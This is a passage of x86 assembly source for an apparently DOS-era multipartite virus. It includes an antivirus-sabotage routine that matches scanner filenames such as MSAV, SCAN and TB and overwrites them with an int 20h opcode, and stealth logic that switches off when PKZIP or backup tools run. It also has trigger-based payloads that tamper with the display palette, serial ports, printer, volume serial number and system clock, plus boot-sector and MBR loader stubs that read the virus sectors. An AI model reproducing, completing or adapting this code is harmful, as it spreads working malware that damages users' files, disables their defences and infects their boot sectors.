           sbb word ptr es:[di+13h],0
           retn

   ;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

   change_24h:
           push    ds
           push    es
           push    di
           push    si
                   xor     di,di
                   mov     es,di                   ; to ivt zone
           push    cs
           pop ds
                   mov     si,offset the_24h
                   mov     di,24h*04               ; to int24h table
                   cld
                   cli
                   movsw                           ; restore int24h handler
                   movsw
                   sti
           pop si
           pop di
           pop es
           pop ds
           retn

   hnd_24h:
           mov al,3
                   stc
                   retf    2

   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   check_fname:
                   cld
                   push    di                      ; DI on SFT
                   add     di,20h                  ; offset of filename in SFT
                   mov     si,offset av_strings    ; to strings with av and such
                   xor     ch,ch
                   mov     cl,byte ptr [si]        ; get lenght of this string
           inc si
           push    di
           push    cx
           push    si
                   repe    cmpsb                   ; compare substring
           pop si
           pop cx
                   je      found_string

                   add     si,cx                   ; on next string
           pop di
                   mov     ah,4                    ; get system date
                   int     1ah

                   mov     dl,dh                   ; dl <- month in bcd
                   mov     dh,cl                   ; dh <- year in bcd
                   cmp     dx,9606h
                   jb      exit_loops              ; jump if < june 1996
                   xor     ch,ch
   loop_strings:
           push    di
                   mov     cl,byte ptr [si]        ; next string lenght
           inc si
                   jcxz    founded_l_0             ; all the AV strings done
           push    cx
           push    si
                   repe    cmpsb                   ; compare substrings
           pop si
           pop cx
                   je      found_string            ; if equal then exit and notice
           add si,cx
           pop di
                   jmp     short loop_strings      ; loop through all substrings
   founded_l_0:
           pop di
                   cmp     byte ptr ds:[payload_byte],0
                   je      exit_loops
                   cmp     byte ptr [si],0         ; continue to DOO, WOLF, QUA
                   jne     loop_strings            ; too or check if real end
   exit_loops:
           pop di
           retn
   found_string:
           pop di
           pop di
           pop si

                   mov     si,offset temp_memory
                   mov     word ptr [si],20cdh     ; int20h opcode
                   mov     dx,si
                   mov     ah,40h                  ; write to file
                   mov     cx,2                    ; write two bytes
                   int     87h

                   call    close_file
                   call    close_wtime
                   call    rest_attrib
           push    cs
           pop ds
                   cmp     byte ptr ds:[func_21h + 1],4bh  ; exec
                   jne     not_execfnc
           mov di,sp
                   mov     word ptr ss:[di+0ah],4bffh      ; if exec function then
                                                           ; change AL to ffh
   not_execfnc:
                   jmp     back_inf_w24


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   check_nostealth:
   ; this checks if PKZIP or a backup tool (*BA*) are running. if so it will
   ; set carry and the virus will disable its stealth routines.
           push    ax
           push    bx
           push    si
           push    ds

                   mov     ah,62h                  ; get psp
                   int     87h
           dec bx
                   mov     ds,bx                   ; ds = mcb
                   mov     si,0ah                  ; program name + 02h
                   cmp     word ptr [si],'IZ'      ; pkZIp running?
                   je      disable_it
                   cmp     word ptr [si],'AB'      ; msBAckup or such running?
                   je      disable_it
                   stc
   disable_it:
                   cmc
           pop ds
           pop si
           pop bx
           pop ax
           retn


   ;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
   check_payload:
           push    ds
                   pusha
                   push    cs
                   pop     ds
                   mov     al,byte ptr ds:[payload_byte]   ; check payload byte
                   or      al,al                   ; if 0 then no activation
                   jne     dododo                  ; else can be from 1 to 8
                   jmp     fast_retu               ; just go back
   dododo:
                   xor     bx,bx
                   xor     cx,cx
                   dec     al
                   jne     al_bigger_1
                   cmp     ah,3dh                  ; open file function
                   je      payload_al_1
                   cmp     ah,13h                  ; delete file function
                   je      payload_al_1
                   jmp     fast_retu               ; else don't activate
   payload_al_1:
                   mov     ax,1010h                ; set bx register to colors
                   mov     dh,3fh                  ; in dh,ch,cl
                   int     10h

                   xor     dh,dh                   ; set bx register to colors
                   int     10h                     ; in dh,ch,cl
                   jmp     short fast_retu
                   nop

   al_bigger_1:
                   dec     al
                   jnz     al_bigger_2

                   cmp     ah,0eh                  ; select default drive function
                   jne     fast_retu               ; else don't activate

                   mov     ax,101bh                ; sum cx color values to gray
           mov ch,1
                   int     10h
                   jmp     short fast_retu
           nop

   al_bigger_2:
                   dec     al
                   jnz     al_bigger_3

                   cmp     ah,3ah                  ; remove directory function
                   jne     fast_retu               ; else don't activate

                   mov     ah,10h                  ; set single palette register
           mov bx,bp
           xor bx,si
                   mov     bl,11h                  ; overscan color register
                   int     10h
                   jmp     short fast_retu
           nop

   al_bigger_3:
                   dec     al
                   jnz     al_bigger_4

                   cmp     ah,40h                  ; write to file function
                   jne     fast_retu               ; else don't activate

                   mov     cl,2
                   mov     dx,2f8h                 ; com2 adress
   port_out_loop:
                   in      al,dx
                   mov     al,0c0h                 ; send this data byte on
                   out     dx,al                   ; the first loop to com2
                   inc     dh                      ; and on the second to com1
                   loop    port_out_loop

   al_bigger_4:
           dec al
                   jnz     al_bigger_5

                   cmp     ah,5ah                  ; create temporary file
                   jne     fast_retu               ; else don't activate
                   mov     cl,7                    ; virus name lenght
                   mov     si,offset virus_name    ; point at it
   print_vname:
                   mov     ah,5                    ; write char to printer
                   lodsb
                   mov     dl,al                   ; char to print
                   int     87h                     ; print that
                   loop    print_vname

   al_bigger_5:
                   dec     al
                   jnz     al_bigger_6

                   mov     ax,440dh                ; ioctl request
                   mov     cx,846h                 ; set volume and SN on hd
                   mov     dx,offset vol_ser       ; DS:DX DPB to virus new data
                   int     87h

   al_bigger_6:
                   dec     al
                   jnz     fast_retu

                   mov     ah,2                    ; get system clock
                   int     1ah

                   mov     ah,3
                   inc     cl                      ; increment minutes by one
                   int     1ah                     ; set system clock
   fast_retu:
                   popa
                   pop     ds                      ; return from payload routines
                   ret

   vol_ser:
                   db      00h
                   db      'GENOCIDEYouthEnergy'

   ; table for extra track formattation
   format_table:
                   db      51h, 00h, 01h, 02h
                   db      51h, 00h, 02h, 02h
                   db      51h, 00h, 03h, 02h
                   db      51h, 00h, 04h, 02h
                   db      51h, 00h, 05h, 02h
                   db      51h, 00h, 06h, 02h
                   db      51h, 00h, 07h, 02h
                   db      51h, 00h, 08h, 02h
                   db      51h, 00h, 09h, 02h

   av_strings:
                   db       04h,"CHKD"
                   db       02h,"F-"
                   db       03h,"VIR"
                   db       05h,"SCAN "
                   db       05h,"CLEAN"
                   db       04h,"VSHI"
                   db       04h,"ITAV"
                   db       04h,"SKUD"
                   db       04h,"AVIR"
                   db       04h,"MSAV"
                   db       04h,"CPAV"
                   db       04h,"VSAF"
                   db       04h,"VWAT"
                   db       03h,"NAV"
                   db       03h,"THS"
                   db       02h,"TB"
                   db       03h,"VI-"
                   db       03h,"FLU"
                   db       04h,"?ATP"
                   db       00h                    ; end of AV and such strings

                   db       03h,"DOO"
                   db       04h,"WOLF"
                   db       03h,"QUA"

                   db       00h                    ; two zeros as end of all
                   db       00h                    ; strings


   ; standard starting part for both floppy boot and mbr
   generic_boot:
                   cli
                   xor     ax,ax
                   mov     ss,ax
                   mov     sp,7c00h                ; set SS:SP as usual
                   push    ax
                   pop     ds
                   push    ds                      ; and make AX=DS=ES=0
                   pop     es
                   sti
   generic_boot_end:

   ; standard mbr part
   mbr_part:
                   mov     ax,208h                 ; read 8 virus sectors
                   mov     bx,7e00h                ; to 0:7e00h
                   mov     cx,4                    ; starting from
                   push    cx
                   mov     dx,80h
                   push    dx                      ; store on stack for later
                   int     13h                     ; read sectors
                   db      0eah                    ; jump there
                   dw      0h,07e0h
   mbr_part_end:


   ; standard floppy boot part
   floppy_part:
                   mov     ax,208h                 ; read 8 virus sectors
                   mov     bx,7e00h                ; to 0:7e00h
                   mov     cx,5102h                ; starting from
                   push    cx
                   xor     dx,dx
                   push    dx                      ; store on stack for later
                   int     13h                     ; read sectors
   infnty:
                   jb      infnty
                   db      0eah                    ; jump there
                   dw      0h,07e0h
   floppy_part_end:


   ; here are the 1ah bytes from the original file
   original_file   db      90h,90h,90h
                   db      90h
                   dw      5 dup (9090h)
   original_ss     dw      9090h
   original_sp     dw      9090h
                   dw      9090h
   original_ip     dw      9090h
   original_cs     dw      9090h
                   dw      9090h

   temp_memory     db      200h dup (?)            ; temp space for infactions

   check_by        db      00h
   fname_dx        dw      00h
   fname_ds        dw      00h
   payload_byte    db      00h
   the_24h         dd      00h
   what_call       dw      00h

   temp_memend:

   seg_a       ends
           end start
